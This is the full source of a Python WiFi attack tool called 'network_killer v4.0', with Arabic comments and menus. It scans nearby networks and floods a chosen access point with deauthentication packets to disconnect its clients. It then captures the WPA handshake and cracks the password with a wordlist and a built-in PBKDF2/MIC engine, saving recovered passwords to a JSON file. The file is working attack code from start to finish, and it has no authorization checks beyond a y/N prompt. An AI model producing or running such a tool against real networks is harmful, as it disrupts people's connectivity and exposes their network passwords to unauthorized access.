#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================
 network_killer v4.0
 ================================================================
 - سكان الشبكات
 - اختيار شبكة
 - هجوم Deauth (تعطيل الشبكة)
 - التقاط Handshake (EAPOL 4-way)
 - كسر Handshake بكلمة مرور (wordlist)
 - تخمين الشبكة مباشرة بكلمة مرور (بدون التقاط handshake)
 - إعادة استخدام الـ handshake المحفوظ
 - تقرير JSON

 المبرمج: جنرال عباس | @s.nfu
 التعديل: إضافة خيار "تخمين الشبكة بكلمة مرور"
 الاستخدام: sudo python3 network_killer_v4.py
================================================================
"""

import os
import re
import signal
import struct
import hmac
import hashlib
import subprocess
import sys
import time
import glob
import json
import shutil
import threading
import multiprocessing
from datetime import datetime
from queue import Queue, Empty


class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    B = "\033[94m"; CY = "\033[96m"; M = "\033[95m"
    BO = "\033[1m"; RS = "\033[0m"


# ==================== الإعدادات ====================
WORK_DIR = os.path.expanduser("~/netkiller")
HS_DIR   = os.path.join(WORK_DIR, "hs")
DUMP_DIR = os.path.join(WORK_DIR, "dumps")
LOG_FILE = os.path.join(WORK_DIR, "netkiller.log")
RESULT_FILE = os.path.join(WORK_DIR, "cracked.json")
for d in (WORK_DIR, HS_DIR, DUMP_DIR):
    os.makedirs(d, exist_ok=True)

SCAN_TIME        = 20
DEAUTH_BURST     = 64
BURST_INTERVAL   = 0.3
CAPTURE_TIMEOUT  = 180
CAPTURE_MIN_SIZE = 10000


def log(msg):
    try:
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {msg}\n")
    except Exception:
        pass


def run(cmd, timeout=None):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout or "", r.stderr or ""
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"
    except Exception as e:
        return 1, "", str(e)


def have(tool):
    return shutil.which(tool) is not None


# ==================== تشخيص البيئة ====================
def detect_monitor_iface():
    rc, out, _ = run(["iw", "dev"])
    if rc != 0:
        return None
    cur = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface "):
            cur = line.split()[1]
        elif line == "type monitor" and cur:
            return cur
    return None


def detect_managed_iface():
    rc, out, _ = run(["nmcli", "-t", "-f", "DEVICE,TYPE", "device", "status"])
    for line in out.splitlines():
        if "wifi" in line:
            return line.split(":")[0]
    return None


def enable_monitor(base_iface=None):
    iface = detect_monitor_iface()
    if iface:
        return iface
    if base_iface is None:
        base_iface = detect_managed_iface()
    if not base_iface:
        return None
    run(["airmon-ng", "check", "kill"])
    run(["airmon-ng", "start", base_iface])
    iface = detect_monitor_iface()
    if not iface:
        rc, out, _ = run(["iw", "dev", base_iface, "info"])
        if "type monitor" in out:
            iface = base_iface
    return iface


def diagnose():
    print(f"\n{C.CY}╔═══ التشخيص ═══╗{C.RS}")
    issues = []
    for tool in ("iw", "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"):
        ok = have(tool)
        color = C.G if ok else C.R
        print(f"    {color}{'✓' if ok else '✗'} {tool}{C.RS}")
        if not ok:
            issues.append(f"missing:{tool}")

    iface = detect_monitor_iface()
    if iface:
        print(f"    {C.G}✓ monitor: {iface}{C.RS}")
    else:
        managed = detect_managed_iface()
        print(f"    {C.Y}→ managed: {managed}{C.RS}")
        issues.append("no_monitor")

    if os.geteuid() != 0:
        print(f"    {C.R}✗ ليس root{C.RS}")
        issues.append("not_root")

    print(f"{C.CY}╚═════════════════╝{C.RS}")
    return {"iface": iface, "issues": issues}


def auto_fix(diag):
    if "not_root" in diag["issues"]:
        print(f"{C.R}✗ شغّل الأداة بـ sudo{C.RS}")
        return None
    missing = [i.split(":")[1] for i in diag["issues"] if i.startswith("missing:")]
    if missing:
        print(f"{C.Y}ثبّت: sudo apt install aircrack-ng wireless-tools iw{C.RS}")
        return None
    if "no_monitor" in diag["issues"]:
        managed = detect_managed_iface()
        if not managed:
            print(f"{C.R}✗ لا واجهة WiFi{C.RS}")
            return None
        print(f"{C.Y}[*] تفعيل monitor mode على {managed}...{C.RS}")
        run(["airmon-ng", "check", "kill"])
        time.sleep(1)
        run(["airmon-ng", "start", managed])
        time.sleep(2)
        iface = detect_monitor_iface()
        if iface:
            return iface
        run(["ip", "link", "set", managed, "down"])
        run(["iw", "dev", managed, "set", "type", "monitor"])
        run(["ip", "link", "set", managed, "up"])
        time.sleep(1)
        rc, out, _ = run(["iw", "dev", managed, "info"])
        if "type monitor" in out:
            return managed
        return None
    return diag["iface"]


# ==================== سكان ====================
def scan_networks(iface, duration=SCAN_TIME):
    print(f"\n{C.B}[*] سكان {duration} ثانية على {iface}{C.RS}")
    out_prefix = os.path.join(DUMP_DIR, f"scan_{int(time.time())}")
    log_file = os.path.join(DUMP_DIR, "airodump.log")

    with open(log_file, "w") as lf:
        p = subprocess.Popen(
            ["timeout", str(duration), "airodump-ng",
             "--output-format", "csv", "-w", out_prefix, iface],
            stdout=lf, stderr=subprocess.STDOUT)
        for i in range(duration):
            print(f"\r{C.Y}    [{i+1}/{duration}] ثانية...{C.RS}", end="")
            time.sleep(1)
        print()
        try:
            p.wait(timeout=8)
        except Exception:
            p.kill()

    with open(log_file) as lf:
        log_content = lf.read()

    csvs = glob.glob(out_prefix + "*.csv")
    if not csvs:
        print(f"{C.R}✗ فشل السكان{C.RS}")
        print(f"{C.Y}  log: {log_content[:300]}{C.RS}")
        return None

    aps = []
    with open(csvs[0], encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()

    in_ap = False
    for line in lines:
        s = line.strip()
        if s.startswith("BSSID"):
            in_ap = True
            continue
        if s.startswith("Station MAC"):
            in_ap = False
            continue
        if not in_ap or not s:
            continue
        parts = [x.strip() for x in line.split(",")]
        if len(parts) < 14:
            continue
        bssid = parts[0]
        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
            continue
        try:
            ch = int(parts[3]) if parts[3].isdigit() else 0
            pwr = int(parts[8]) if parts[8].lstrip("-").isdigit() else -100
        except Exception:
            ch, pwr = 0, -100
        aps.append({
            "bssid": bssid, "channel": ch, "power": pwr,
            "encryption": parts[5], "cipher": parts[6],
            "auth": parts[7], "essid": parts[13] or "<hidden>",
        })
    aps.sort(key=lambda x: x["power"], reverse=True)
    return aps


def display_networks(aps):
    if not aps:
        print(f"{C.R}✗ لا شبكات{C.RS}")
        return
    print(f"\n{C.CY}{'#':<4}{'PWR':<7}{'CH':<5}{'ENC':<12}{'BSSID':<20}SSID{C.RS}")
    print(f"{C.CY}{'─' * 78}{C.RS}")
    for i, ap in enumerate(aps, 1):
        color = C.G if ap["power"] > -60 else (C.Y if ap["power"] > -75 else C.R)
        print(f"{color}{i:<4}{ap['power']:<7}{ap['channel']:<5}"
              f"{ap['encryption']:<12}{ap['bssid']:<20}{ap['essid']}{C.RS}")


# ==================== Deauth Attack ====================
class DeauthAttack:
    def __init__(self, iface, bssid, channel):
        self.iface = iface
        self.bssid = bssid
        self.channel = channel
        self.running = False
        self.thread = None
        self.deauth_sent = 0

    def _lock_channel(self):
        run(["iw", "dev", self.iface, "set", "channel", str(self.channel)])

    def _loop(self):
        while self.running:
            try:
                subprocess.run(
                    ["aireplay-ng", "--deauth", str(DEAUTH_BURST),
                     "-a", self.bssid, self.iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    timeout=8)
                self.deauth_sent += DEAUTH_BURST
            except Exception:
                pass
            time.sleep(BURST_INTERVAL)

    def start(self):
        self.running = True
        self._lock_channel()
        self.thread = threading.Thread(target=self._loop, daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join(timeout=3)


# ==================== Handshake Capture ====================
class HandshakeCapture:
    def __init__(self, iface, ap, timeout=CAPTURE_TIMEOUT):
        self.iface = iface
        self.ap = ap
        self.timeout = timeout
        self.running = False
        self.thread = None
        self.deauth = None
        self.cap_file = None
        self.ad_proc = None
        self.prefix = None

    def _existing_handshake(self):
        tag = self.ap["bssid"].replace(":", "-")
        files = glob.glob(os.path.join(HS_DIR, f"handshake_*_{tag}_*.cap"))
        files = [f for f in files if os.path.getsize(f) > CAPTURE_MIN_SIZE]
        files.sort(key=os.path.getmtime, reverse=True)
        for f in files:
            if parse_handshake(f):
                return f
        return None

    def _start_airodump(self):
        safe = re.sub(r"[^\w.-]", "_", self.ap["essid"] or "unknown")[:32]
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.prefix = os.path.join(
            HS_DIR, f"handshake_{safe}_{self.ap['bssid'].replace(':','-')}_{ts}")
        cmd = ["airodump-ng", "-c", str(self.ap["channel"]),
               "--bssid", self.ap["bssid"], "-w", self.prefix,
               "--output-format", "pcap", self.iface]
        self.ad_proc = subprocess.Popen(
            cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def _capture_loop(self, out_q):
        cap = self.prefix + "-01.cap"
        start = time.time()
        for round_n in range(1, 30):
            if not self.running:
                break
            if time.time() - start > self.timeout:
                out_q.put(("timeout", None))
                break
            out_q.put(("status", f"deauth جولة {round_n}"))

            try:
                subprocess.run(
                    ["aireplay-ng", "--deauth", "10",
                     "-a", self.ap["bssid"], self.iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    timeout=12)
            except Exception:
                pass

            for _ in range(15):
                time.sleep(1)
                if os.path.exists(cap):
                    hs = parse_handshake(cap, quiet=True)
                    if hs:
                        self.cap_file = cap
                        out_q.put(("found", cap))
                        return
                out_q.put(("status", f"فحص... ({int(time.time()-start)}s)"))

        if not self.cap_file:
            out_q.put(("fail", None))

    def start(self, out_q):
        existing = self._existing_handshake()
        if existing:
            print(f"{C.G}[♻] handshake موجود مسبقاً: {os.path.basename(existing)}{C.RS}")
            self.cap_file = existing
            out_q.put(("found", existing))
            return

        self.running = True
        self._start_airodump()
        time.sleep(3)
        self.deauth = DeauthAttack(self.iface, self.ap["bssid"], self.ap["channel"])
        self.deauth.start()
        self.thread = threading.Thread(target=self._capture_loop, args=(out_q,),
                                        daemon=True)
        self.thread.start()

    def stop(self):
        self.running = False
        if self.deauth:
            self.deauth.stop()
        if self.ad_proc:
            try:
                self.ad_proc.send_signal(signal.SIGINT)
                self.ad_proc.wait(timeout=5)
            except Exception:
                self.ad_proc.kill()


# ==================== PCAP Parser ====================
def read_pcap(path):
    with open(path, "rb") as f:
        data = f.read()
    if len(data) < 24:
        raise ValueError("small")
    magic = data[:4]
    m_le = struct.unpack("<I", magic)[0]
    m_be = struct.unpack(">I", magic)[0]
    if m_le in (0xa1b2c3d4, 0xa1b23c4d):
        endian = "<"
    elif m_be in (0xa1b2c3d4, 0xa1b23c4d):
        endian = ">"
    elif m_le in (0xd4c3b2a1, 0x4d3cb2a1):
        endian = ">"
    elif m_be in (0xd4c3b2a1, 0x4d3cb2a1):
        endian = "<"
    else:
        raise ValueError("bad magic")
    linktype = struct.unpack(endian + "I", data[20:24])[0]
    packets = []
    off = 24
    while off + 16 <= len(data):
        il = struct.unpack(endian + "I", data[off+8:off+12])[0]
        off += 16
        if off + il > len(data):
            break
        packets.append(data[off:off+il])
        off += il
    return linktype, packets


def strip_radiotap(pkt):
    if len(pkt) < 8:
        return None
    it_len = struct.unpack("<H", pkt[2:4])[0]
    if it_len > len(pkt) or it_len < 8:
        return None
    return pkt[it_len:]


def dot11_fc(frame):
    if len(frame) < 2:
        return None, None
    fc = struct.unpack("<H", frame[0:2])[0]
    return (fc >> 2) & 0x3, (fc >> 4) & 0xf


def get_ssid(frame):
    ftype, subtype = dot11_fc(frame)
    if ftype != 0 or subtype not in (5, 8):
        return None
    if len(frame) < 36:
        return None
    tags = frame[36:]
    i = 0
    while i + 2 <= len(tags):
        tid = tags[i]; tlen = tags[i+1]
        if i + 2 + tlen > len(tags):
            break
        if tid == 0:
            return bytes(tags[i+2:i+2+tlen])
        i += 2 + tlen
    return None


def extract_eapol(frame):
    ftype, subtype = dot11_fc(frame)
    if ftype != 2:
        return None
    fc = struct.unpack("<H", frame[0:2])[0]
    to_ds = (fc >> 8) & 1
    from_ds = (fc >> 9) & 1
    hdr = 24
    if subtype & 0x8:
        hdr += 2
    if to_ds and from_ds:
        hdr += 6
    if len(frame) < hdr + 8:
        return None
    llc = frame[hdr:hdr+8]
    if llc[:6] != b"\xaa\xaa\x03\x00\x00\x00":
        return None
    if llc[6:8] != b"\x88\x8e":
        return None
    return frame[hdr+8:], frame


def parse_eapol_key(eapol):
    if len(eapol) < 99:
        return None
    if eapol[1] != 3:
        return None
    body = eapol[4:]
    if len(body) < 95:
        return None
    ki = struct.unpack(">H", body[1:3])[0]
    key_ack = (ki >> 7) & 1
    key_mic = (ki >> 8) & 1
    nonce = body[13:45]
    mic = body[77:93]
    eapol_len = struct.unpack(">H", eapol[2:4])[0]
    total = min(4 + eapol_len, len(eapol))
    return {"raw": eapol[:total], "key_ack": key_ack, "key_mic": key_mic,
            "nonce": nonce, "mic": mic}


def parse_handshake(path, quiet=True):
    try:
        linktype, packets = read_pcap(path)
    except Exception:
        return None
    ssid = None
    m1, m2 = [], []
    for pkt in packets:
        frame = pkt
        if linktype == 127:
            frame = strip_radiotap(pkt)
            if frame is None:
                continue
        if not ssid:
            s = get_ssid(frame)
            if s:
                ssid = s
        res = extract_eapol(frame)
        if not res:
            continue
        eapol, full = res
        p = parse_eapol_key(eapol)
        if not p or len(full) < 16:
            continue
        a1 = full[4:10]; a2 = full[10:16]
        if p["key_ack"] and not p["key_mic"]:
            m1.append({"nonce": p["nonce"], "ap": a2, "sta": a1, "eapol": p["raw"]})
        elif p["key_mic"] and not p["key_ack"]:
            m2.append({"nonce": p["nonce"], "sta": a2, "ap": a1,
                       "mic": p["mic"], "eapol": p["raw"]})
    if not ssid or not m1 or not m2:
        return None
    for a in m1:
        for b in m2:
            if a["ap"] == b["ap"] and a["sta"] == b["sta"]:
                mac1, mac2 = sorted([a["ap"], b["sta"]])
                n1, n2 = sorted([a["nonce"], b["nonce"]])
                return {"ssid": ssid, "mac1": mac1, "mac2": mac2,
                        "nonce1": n1, "nonce2": n2,
                        "mic": b["mic"], "eapol": b["eapol"]}
    return None


# ==================== Crypto engine ====================
_G = {}
def _init(hs):
    global _G
    _G = hs

def compute_pmk(pw, ssid):
    return hashlib.pbkdf2_hmac("sha1", pw, ssid, 4096, 32)

def compute_ptk(pmk, m1, m2, n1, n2):
    data = m1 + m2 + n1 + n2
    ptk = b""
    for i in range(4):
        ptk += hmac.new(pmk, b"Pairwise key expansion\x00" + data + bytes([i]),
                        hashlib.sha1).digest()
    return ptk[:64]

def check_pw(pw):
    try:
        pmk = compute_pmk(pw, _G["ssid"])
        ptk = compute_ptk(pmk, _G["mac1"], _G["mac2"],
                          _G["nonce1"], _G["nonce2"])
        frame = bytearray(_G["eapol"])
        for i in range(81, 97):
            frame[i] = 0
        comp = hmac.new(ptk[:16], bytes(frame), hashlib.sha1).digest()[:16]
        if hmac.compare_digest(comp, _G["mic"]):
            return pw
    except Exception:
        pass
    return None


def crack_handshake(hs, wordlist, workers=None, single=False):
    if not os.path.exists(wordlist):
        print(f"{C.R}✗ wordlist غير موجود: {wordlist}{C.RS}")
        return None
    with open(wordlist, "rb") as f:
        passwords = [l.strip() for l in f if l.strip()]
    total = len(passwords)
    print(f"{C.G}[+] عدد الكلمات: {total:,}{C.RS}")

    if single or total < 100:
        workers = 1
    elif workers is None:
        try:
            workers = max(1, multiprocessing.cpu_count() - 1)
        except Exception:
            workers = 1
    print(f"{C.G}[+] عدد المعالجات: {workers}{C.RS}\n")

    start = time.time()
    found = None
    tested = 0
    print(f"{C.CY}{'═' * 60}{C.RS}")

    try:
        if workers == 1:
            _init(hs)
            for pw in passwords:
                tested += 1
                r = check_pw(pw)
                if r:
                    found = r
                    break
                if tested % 200 == 0:
                    _progress(tested, total, start)
        else:
            with multiprocessing.Pool(workers, initializer=_init,
                                       initargs=(hs,)) as pool:
                for r in pool.imap_unordered(check_pw, passwords, chunksize=200):
                    tested += 1
                    if r:
                        found = r
                        pool.terminate()
                        break
                    if tested % 200 == 0:
                        _progress(tested, total, start)
    except Exception as e:
        print(f"\n{C.Y}⚠ multiprocessing فشل: {e} — وضع فردي{C.RS}")
        _init(hs)
        for pw in passwords[tested:]:
            tested += 1
            r = check_pw(pw)
            if r:
                found = r
                break
            if tested % 200 == 0:
                _progress(tested, total, start)

    print()
    elapsed = time.time() - start
    print(f"{C.CY}{'═' * 60}{C.RS}")

    if found:
        pwd = found.decode("utf-8", errors="ignore")
        print(f"\n{C.G}{C.BO}✅ كلمة السر: {pwd}{C.RS}")
        print(f"{C.G}⏱  {elapsed:.1f}s | 📊 {tested:,} محاولة{C.RS}")
        log(f"CRACKED ssid={hs['ssid'].decode(errors='ignore')} pwd={pwd}")
        return pwd
    print(f"\n{C.R}❌ لم يتم العثور على كلمة السر{C.RS}")
    print(f"{C.Y}📊 {tested:,} محاولة في {elapsed:.1f}s{C.RS}")
    return None


def _progress(tested, total, start):
    el = time.time() - start
    speed = tested / el if el > 0 else 0
    rem = (total - tested) / speed if speed > 0 else 0
    pct = (tested / total) * 100
    filled = int(40 * pct / 100)
    bar = "█" * filled + "░" * (40 - filled)
    print(f"\r{C.Y}[{bar}] {pct:.1f}% | {tested:,}/{total:,} | "
          f"{speed:,.0f} H/s | {int(rem)}s{C.RS}", end="")


# ==================== تخمين الشبكة مباشرة ====================
def guess_network_password(ap, wordlist, iface, single=False):
    """
    تخمين كلمة مرور الشبكة مباشرة باستخدام wordlist.
    الطريقة: التقاط handshake أولاً ثم كسره بالـ wordlist.
    """
    print(f"\n{C.M}╔═══ تخمين الشبكة ═══╗{C.RS}")
    print(f"  {C.CY}SSID  : {ap['essid']}{C.RS}")
    print(f"  {C.CY}BSSID : {ap['bssid']}{C.RS}")
    print(f"  {C.CY}CH    : {ap['channel']}{C.RS}")
    print(f"  {C.CY}ENC   : {ap['encryption']}{C.RS}")
    print(f"{C.M}╚═════════════════════╝{C.RS}\n")

    if not os.path.exists(wordlist):
        print(f"{C.R}✗ wordlist غير موجود: {wordlist}{C.RS}")
        return None

    # 1) ابحث عن handshake موجود
    hs = None
    tag = ap["bssid"].replace(":", "-")
    files = glob.glob(os.path.join(HS_DIR, f"handshake_*_{tag}_*.cap"))
    files = [f for f in files if os.path.getsize(f) > CAPTURE_MIN_SIZE]
    files.sort(key=os.path.getmtime, reverse=True)
    for f in files:
        hs = parse_handshake(f)
        if hs:
            print(f"{C.G}[♻] استخدام handshake موجود: {os.path.basename(f)}{C.RS}")
            break
    if not hs:
        # 2) التقط handshake جديد
        print(f"{C.Y}[*] لا يوجد handshake محفوظ — بدء الالتقاط...{C.RS}")
        out_q = Queue()
        cap = HandshakeCapture(iface, ap, timeout=CAPTURE_TIMEOUT)
        cap.start(out_q)
        found = False
        while True:
            try:
                msg = out_q.get(timeout=1)
                if msg[0] == "status":
                    print(f"\r{C.Y}  {msg[1]}{C.RS}" + " " * 20, end="")
                elif msg[0] == "found":
                    print(f"\n{C.G}✓ Handshake: {os.path.basename(msg[1])}{C.RS}")
                    hs = parse_handshake(msg[1])
                    found = True
                    break
                elif msg[0] in ("timeout", "fail"):
                    print(f"\n{C.R}✗ فشل الالتقاط{C.RS}")
                    break
            except Empty:
                if not cap.running and not found:
                    break
        cap.stop()
        if not hs:
            print(f"{C.R}✗ لا يمكن التخمين بدون handshake{C.RS}")
            return None

    # 3) اكسر الـ handshake بالـ wordlist
    print(f"\n{C.CY}[*] بدء التخمين بكلمة المرور...{C.RS}")
    pwd = crack_handshake(hs, wordlist, single=single)
    if pwd:
        # احفظ النتيجة
        try:
            data = json.load(open(RESULT_FILE)) if os.path.exists(RESULT_FILE) else []
        except Exception:
            data = []
        data.append({
            "essid": ap["essid"],
            "bssid": ap["bssid"],
            "password": pwd,
            "handshake": hs.get("ssid", b"").decode(errors="ignore"),
            "wordlist": wordlist,
            "ts": datetime.now().isoformat(),
        })
        try:
            json.dump(data, open(RESULT_FILE, "w"),
                      indent=2, ensure_ascii=False)
        except Exception:
            pass
    return pwd


# ==================== Main ====================
def main():
    print(f"""
{C.CY}╔══════════════════════════════════════════════════════════════╗
║  network_killer v4.0                                          ║
║  سكان · هجوم · التقاط · كسر · تخمين مباشر                    ║
║  المبرمج: جنرال عباس | @s.nfu                                ║
╚══════════════════════════════════════════════════════════════╝{C.RS}
""")

    diag = diagnose()
    iface = auto_fix(diag)
    if not iface:
        print(f"{C.R}✗ لا يمكن المتابعة{C.RS}")
        return
    print(f"{C.G}✓ الواجهة: {iface}{C.RS}")

    aps = []
    capture = None
    last_hs = None
    last_hs_file = None

    while True:
        print(f"\n{C.CY}═══ القائمة الرئيسية ═══{C.RS}")
        print(f"  {C.BO}1){C.RS} سكان الشبكات")
        print(f"  {C.BO}2){C.RS} عرض القائمة")
        print(f"  {C.BO}3){C.RS} هجوم Deauth (تعطيل)")
        print(f"  {C.BO}4){C.RS} التقاط Handshake")
        print(f"  {C.BO}5){C.RS} كسر Handshake (بكلمة مرور)")
        print(f"  {C.BO}6){C.RS} تخمين الشبكة (اختر شبكة + wordlist)")
        print(f"  {C.BO}7){C.RS} إيقاف العمليات النشطة")
        print(f"  {C.BO}8){C.RS} إعادة التشخيص")
        print(f"  {C.BO}9){C.RS} عرض النتائج المحفوظة")
        print(f"  {C.BO}0){C.RS} خروج")

        try:
            choice = input(f"{C.CY}اختيارك: {C.RS}").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if choice == "0":
            break

        elif choice == "1":
            r = scan_networks(iface, SCAN_TIME)
            if r is not None:
                aps = r
                display_networks(aps)

        elif choice == "2":
            display_networks(aps)

        elif choice == "3":
            if not aps:
                print(f"{C.Y}✗ سكان أولاً{C.RS}")
                continue
            display_networks(aps)
            try:
                n = int(input(f"{C.CY}رقم الشبكة: {C.RS}").strip())
                if not (1 <= n <= len(aps)):
                    raise ValueError
            except ValueError:
                print(f"{C.R}✗ رقم غير صالح{C.RS}")
                continue
            t = aps[n - 1]
            conf = input(f"{C.Y}هجوم على {t['essid']}؟ [y/N]: {C.RS}").lower()
            if conf != "y":
                continue
            if capture:
                capture.stop()
                capture = None
            d = DeauthAttack(iface, t["bssid"], t["channel"])
            d.start()
            time.sleep(2)
            print(f"{C.R}[⚡] هجوم نشط. اضغط Enter لإيقافه...{C.RS}")
            try:
                input()
            except Exception:
                pass
            d.stop()
            print(f"{C.Y}⏹ أُرسلت {d.deauth_sent} حزمة{C.RS}")

        elif choice == "4":
            if not aps:
                print(f"{C.Y}✗ سكان أولاً{C.RS}")
                continue
            display_networks(aps)
            try:
                n = int(input(f"{C.CY}رقم الشبكة لالتقاط Handshake: {C.RS}").strip())
                if not (1 <= n <= len(aps)):
                    raise ValueError
            except ValueError:
                print(f"{C.R}✗ رقم غير صالح{C.RS}")
                continue
            t = aps[n - 1]
            print(f"\n{C.M}الهدف: {t['essid']} ({t['bssid']}) ch={t['channel']}{C.RS}")
            conf = input(f"{C.Y}بدء الالتقاط؟ [y/N]: {C.RS}").lower()
            if conf != "y":
                continue

            if capture:
                capture.stop()

            out_q = Queue()
            capture = HandshakeCapture(iface, t, timeout=CAPTURE_TIMEOUT)
            capture.start(out_q)

            found = False
            while True:
                try:
                    msg = out_q.get(timeout=1)
                    if msg[0] == "status":
                        print(f"\r{C.Y}  {msg[1]}{C.RS}" + " " * 20, end="")
                    elif msg[0] == "found":
                        print(f"\n{C.G}✓ Handshake: {os.path.basename(msg[1])}{C.RS}")
                        last_hs_file = msg[1]
                        last_hs = parse_handshake(msg[1])
                        found = True
                        break
                    elif msg[0] == "timeout" or msg[0] == "fail":
                        print(f"\n{C.R}✗ فشل الالتقاط{C.RS}")
                        break
                except Empty:
                    if not capture.running and not found:
                        break

            capture.stop()
            capture = None

        elif choice == "5":
            print(f"\n{C.CY}مصدر Handshake:{C.RS}")
            print(f"  {C.BO}1){C.RS} استخدام آخر handshake تم التقاطه")
            print(f"  {C.BO}2){C.RS} اختيار ملف handshake يدوياً")
            src = input(f"{C.CY}اختيارك [1/2]: {C.RS}").strip()

            hs = None
            if src == "1":
                if not last_hs:
                    print(f"{C.Y}✗ لا يوجد handshake محفوظ — التقط أولاً (خيار 4){C.RS}")
                    continue
                hs = last_hs
                print(f"{C.G}✓ استخدام: {os.path.basename(last_hs_file)}{C.RS}")
            elif src == "2":
                path = input(f"{C.CY}مسار ملف .cap: {C.RS}").strip()
                path = os.path.expanduser(path)
                if not os.path.exists(path):
                    print(f"{C.R}✗ الملف غير موجود{C.RS}")
                    continue
                hs = parse_handshake(path)
                if not hs:
                    print(f"{C.R}✗ الملف غير صالح أو لا يحتوي handshake{C.RS}")
                    continue
                last_hs_file = path
            else:
                continue

            ssid = hs["ssid"].decode(errors="ignore")
            print(f"\n{C.M}الشبكة: {ssid}{C.RS}")
            print(f"{C.CY}AP MAC: {hs['mac1'].hex(':')}{C.RS}")

            default_wl = os.path.expanduser("~/netkiller/wordlist.txt")
            wl = input(f"{C.CY}مسار Wordlist [{default_wl}]: {C.RS}").strip()
            if not wl:
                wl = default_wl
            wl = os.path.expanduser(wl)
            if not os.path.exists(wl):
                print(f"{C.R}✗ wordlist غير موجود: {wl}{C.RS}")
                continue

            print(f"\n{C.CY}عدد المعالجات:{C.RS}")
            print(f"  {C.BO}1){C.RS} تلقائي (cpu_count - 1)")
            print(f"  {C.BO}2){C.RS} معالج واحد (single)")
            m = input(f"{C.CY}اختيارك [1/2]: {C.RS}").strip()
            single = (m == "2")

            print(f"\n{C.CY}بدء الكسر...{C.RS}")
            pwd = crack_handshake(hs, wl, single=single)
            if pwd:
                try:
                    data = json.load(open(RESULT_FILE)) if os.path.exists(RESULT_FILE) else []
                except Exception:
                    data = []
                data.append({
                    "essid": ssid,
                    "bssid": hs["mac1"].hex(":"),
                    "password": pwd,
                    "handshake": last_hs_file,
                    "wordlist": wl,
                    "ts": datetime.now().isoformat(),
                })
                try:
                    json.dump(data, open(RESULT_FILE, "w"),
                              indent=2, ensure_ascii=False)
                except Exception:
                    pass

        elif choice == "6":
            # ===== تخمين الشبكة مباشرة =====
            if not aps:
                print(f"{C.Y}✗ سكان أولاً (خيار 1){C.RS}")
                continue
            display_networks(aps)
            try:
                n = int(input(f"{C.CY}رقم الشبكة للتخمين: {C.RS}").strip())
                if not (1 <= n <= len(aps)):
                    raise ValueError
            except ValueError:
                print(f"{C.R}✗ رقم غير صالح{C.RS}")
                continue
            t = aps[n - 1]

            default_wl = os.path.expanduser("~/netkiller/wordlist.txt")
            print(f"\n{C.Y}أدخل مسار ملف كلمات المرور{C.RS}")
            wl = input(f"{C.CY}مسار Wordlist [{default_wl}]: {C.RS}").strip()
            if not wl:
                wl = default_wl
            wl = os.path.expanduser(wl)
            if not os.path.exists(wl):
                print(f"{C.R}✗ wordlist غير موجود: {wl}{C.RS}")
                print(f"{C.Y}  أنشئ الملف وأضف كلمات المرور ثم أعد المحاولة{C.RS}")
                continue

            print(f"\n{C.CY}عدد المعالجات:{C.RS}")
            print(f"  {C.BO}1){C.RS} تلقائي")
            print(f"  {C.BO}2){C.RS} معالج واحد")
            m = input(f"{C.CY}اختيارك [1/2]: {C.RS}").strip()
            single = (m == "2")

            conf = input(f"\n{C.Y}بدء التخمين على {t['essid']}؟ [y/N]: {C.RS}").lower()
            if conf != "y":
                continue

            if capture:
                capture.stop()
                capture = None

            pwd = guess_network_password(t, wl, iface, single=single)
            if pwd:
                print(f"\n{C.G}{C.BO}✅ كلمة مرور الشبكة: {pwd}{C.RS}")
            else:
                print(f"\n{C.R}❌ فشل التخمين{C.RS}")

        elif choice == "7":
            if capture:
                capture.stop()
                capture = None
            print(f"{C.Y}⏹ تم إيقاف العمليات النشطة{C.RS}")

        elif choice == "8":
            diag = diagnose()
            new = auto_fix(diag)
            if new:
                iface = new
                print(f"{C.G}✓ الواجهة: {iface}{C.RS}")

        elif choice == "9":
            if os.path.exists(RESULT_FILE):
                try:
                    data = json.load(open(RESULT_FILE))
                    print(f"\n{C.CY}النتائج المحفوظة ({len(data)}):{C.RS}")
                    for r in data[-20:]:
                        print(f"  {C.G}•{C.RS} {r['essid']} — "
                              f"{C.BO}{r['password']}{C.RS} "
                              f"({r.get('ts','?')[:19]})")
                except Exception as e:
                    print(f"{C.R}✗ {e}{C.RS}")
            else:
                print(f"{C.Y}لا نتائج محفوظة{C.RS}")

    if capture:
        capture.stop()
    print(f"\n{C.G}✓ خروج{C.RS}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}⏹ إيقاف{C.RS}")
    except Exception as e:
        print(f"\n{C.R}✗ خطأ: {e}{C.RS}")
